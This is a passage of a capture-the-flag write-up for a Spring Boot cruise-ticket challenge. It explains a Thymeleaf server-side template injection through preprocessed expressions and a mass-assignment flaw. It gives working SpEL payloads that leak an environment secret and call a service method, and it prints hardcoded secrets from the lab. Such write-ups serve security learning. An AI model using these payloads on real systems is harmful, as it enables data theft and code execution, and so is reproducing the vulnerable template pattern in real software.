+<p>Using this coupon code back on the index page to create a ticket gives us a ticket ID, which we can then use to view the ticket and pick up the second flag :
+<img alt="Second flag" src="/images/unitedctf2025/cruise5.png" /></p>
+<h4 id="part-3-intended-ssti">Part 3 - Intended SSTI</h4>
+<p>The author had a different, much cooler vision with the server-side template injection involving using Spring Boot components. We can first confirm the existence of the SSTI within the <code>BOOT-INF/classes/templates/index.html</code> file :</p>
+<pre class="codehilite"><code class="language-html">&lt;div id=&quot;modalContainer&quot; class=&quot;modal-container&quot; th:if=&quot;${ticket.id != null}&quot; th:attr=&quot;style='display:block'&quot;&gt;
+        &lt;!-- Display Ticket Details --&gt;
+        &lt;div class=&quot;popup-content&quot;&gt;
+            &lt;div class=&quot;ticket-details&quot;&gt;
+                &lt;h2&gt;🎟️ Here's your ticket!&lt;/h2&gt;
+                &lt;p&gt;&lt;strong&gt;ID:&lt;/strong&gt; &lt;span th:text=&quot;@{__${ticket.id}__}&quot;&gt;ticket-id&lt;/span&gt;&lt;/p&gt;
+                &lt;p&gt;&lt;strong&gt;Name:&lt;/strong&gt; &lt;span th:text=&quot;@{__${ticket.name}__}&quot;&gt;ticket-msg&lt;/span&gt;&lt;/p&gt;
+                &lt;p&gt;&lt;strong&gt;Flag:&lt;/strong&gt; &lt;span th:text=&quot;@{__${ticket.flag}__}&quot;&gt;ticket-msg&lt;/span&gt;&lt;/p&gt;
+                &lt;button class=&quot;close&quot;&gt;Another ticket!&lt;/button&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+</code></pre>
+
+<p>Normally, Thymeleaf works by evaluating objects following the <code>${variable.value}</code> syntax inside templates and dynamically replacing their escaped values inside at runtime. In this case, the user supplied input is directly put in between double underscores, which means that it becomes preprocessed. The templating engine evaluates the expression ahead of runtime and replace its simpler term inside <code>@{}</code> to build the template, which makes it vulnerable to having the template engine evaluate arbitrary code as Spring Expressions. </p>
+<p>Looking further into the source code, we find a function that will give us the third flag inside <code>FirstClassTicketService</code> :</p>
+<pre class="codehilite"><code class="language-java">package com.united.TicketBoot.ticket;
+
+import java.io.IOException;
+import java.nio.file.Files;
+import java.nio.file.Path;
+import org.springframework.beans.factory.annotation.Value;
+import org.springframework.stereotype.Service;
+
+@Service
+public class FirstClassTicketService {
+    @Value(value=&quot;${ticketboot.superSecretPassword}&quot;)
+    private String secret;
+
+    public String getFlag(String param) throws IOException {
+        if (this.secret.equals(param)) {
+            return Files.readString(Path.of(&quot;/flag3.txt&quot;, new String[0]));
+        }
+        return &quot;Incorrect password&quot;;
+    }
+}
+</code></pre>
+
+<p>We can make the templating engine execute this function, but it needs a secret password stored in the environment variables as an argument. It turns out you can access the environment bean and read its properties using the injected expression, meaning we can fetch the secret password directly through the SSTI.</p>
+<p>The challenge author most likely intended on having participants create tickets using the coupon code from part 2 and using the name parameter as the SSTI payload. Creating a ticket with the name <code>${@environment.getProperty('ticketboot.superSecretPassword')}</code> leaks the secret password :
+<img alt="SSTI to leak password" src="/images/unitedctf2025/cruise6.png" /></p>
+<p>Then, to call the function with the secret password as an argument, we can create a ticket with the name <code>${@firstClassTicketService.getFlag('FIRST_CLASS_TICKETS_ca3e24ded9af48c01df28c830f192f95')}</code> :
+<img alt="Final flag" src="/images/unitedctf2025/cruise7.png" /></p>
+<p>So why were we able to inject an <code>id</code> parameter to create a ticket without the coupon code? Going back to the <code>TicketController</code> class, we can see that the <code>/ticket</code> mapping attempts to create a ticket using the <code>@ModelAttribute</code> annotation :</p>
+<pre class="codehilite"><code class="language-java">@PostMapping(value={&quot;/ticket&quot;})
+@ResponseStatus(value=HttpStatus.CREATED)
+public String createTicket(Model model, @Valid @ModelAttribute Ticket ticket, BindingResult result) {
+    if (result.hasErrors()) {
+        return &quot;index&quot;;
+    }
+
+    if (&quot;FREE_CRUISE_TICKETS_a0e5fce92e91b0d1ba55dcc10732d85d&quot;.equals(ticket.getCouponCode())) {
+        ticket.setFlag(this.FLAG2);
+        Ticket response = this.ticketService.createTicket(ticket);
+        model.addAttribute(&quot;ticketId&quot;, (Object)ticket.getId());
+        model.addAttribute(&quot;ticket&quot;, (Object)new Ticket());
+    } else {
+        result.rejectValue(&quot;couponCode&quot;, &quot;invalid.coupon&quot;, &quot;Invalid coupon code!&quot;);
+    }
+    return &quot;index&quot;;
+}
+</code></pre>
+
+<p>This annotation will bind an HTML form's input fields to the properties of an object (more info on that <a href="https://medium.com/@AlexanderObregon/data-mapping-with-springs-modelattribute-annotation-b41704c2521a">here</a>). When we pass an <code>id</code> or a <code>flag</code> parameter, the <code>createTicket</code> method creates a ticket with those values, effectively making this a mass assignment attack. </p>
+    <!-- Footer will be loaded here -->
+        </div>
+    </div>
+    <div id="footer-placeholder"></div>
+    <script src="/js/script.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-python.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-json.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-java.min.js"></script>
+</body>
+</html>
